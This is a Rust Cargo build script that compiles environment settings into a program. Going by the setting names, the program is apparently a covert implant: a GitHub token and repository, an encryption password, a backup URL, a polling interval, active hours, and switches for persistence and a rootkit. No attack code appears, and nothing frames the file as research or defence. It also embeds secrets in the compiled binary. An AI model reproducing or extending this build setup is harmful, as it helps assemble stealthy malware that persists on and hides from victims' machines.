fn main() {
    // 强制重新编译
    println!("cargo:rerun-if-env-changed=GITHUB_TOKEN");
    println!("cargo:rerun-if-env-changed=GITHUB_REPO");
    println!("cargo:rerun-if-env-changed=ENCRYPTION_PASSWORD");

    // 读取环境变量并注入
    if let Ok(token) = std::env::var("GITHUB_TOKEN") {
        println!("cargo:rustc-env=GITHUB_TOKEN={}", token);
        eprintln!("[build.rs] GITHUB_TOKEN set");
    } else {
        eprintln!("[build.rs] WARNING: GITHUB_TOKEN not set!");
    }

    if let Ok(repo) = std::env::var("GITHUB_REPO") {
        println!("cargo:rustc-env=GITHUB_REPO={}", repo);
        eprintln!("[build.rs] GITHUB_REPO set");
    } else {
        eprintln!("[build.rs] WARNING: GITHUB_REPO not set!");
    }

    if let Ok(password) = std::env::var("ENCRYPTION_PASSWORD") {
        println!("cargo:rustc-env=ENCRYPTION_PASSWORD={}", password);
        eprintln!("[build.rs] ENCRYPTION_PASSWORD set");
    }

    if let Ok(backup_url) = std::env::var("BACKUP_URL") {
        println!("cargo:rustc-env=BACKUP_URL={}", backup_url);
    }

    if let Ok(poll_interval) = std::env::var("POLL_INTERVAL") {
        println!("cargo:rustc-env=POLL_INTERVAL={}", poll_interval);
    }

    if let Ok(active_hours) = std::env::var("ACTIVE_HOURS") {
        println!("cargo:rustc-env=ACTIVE_HOURS={}", active_hours);
    }

    if let Ok(time_window) = std::env::var("TIME_WINDOW") {
        println!("cargo:rustc-env=TIME_WINDOW={}", time_window);
    }

    if let Ok(enable_debug) = std::env::var("ENABLE_DEBUG") {
        println!("cargo:rustc-env=ENABLE_DEBUG={}", enable_debug);
    }

    if let Ok(enable_persistence) = std::env::var("ENABLE_PERSISTENCE") {
        println!("cargo:rustc-env=ENABLE_PERSISTENCE={}", enable_persistence);
    }

    if let Ok(enable_rootkit) = std::env::var("ENABLE_ROOTKIT") {
        println!("cargo:rustc-env=ENABLE_ROOTKIT={}", enable_rootkit);
    }
}
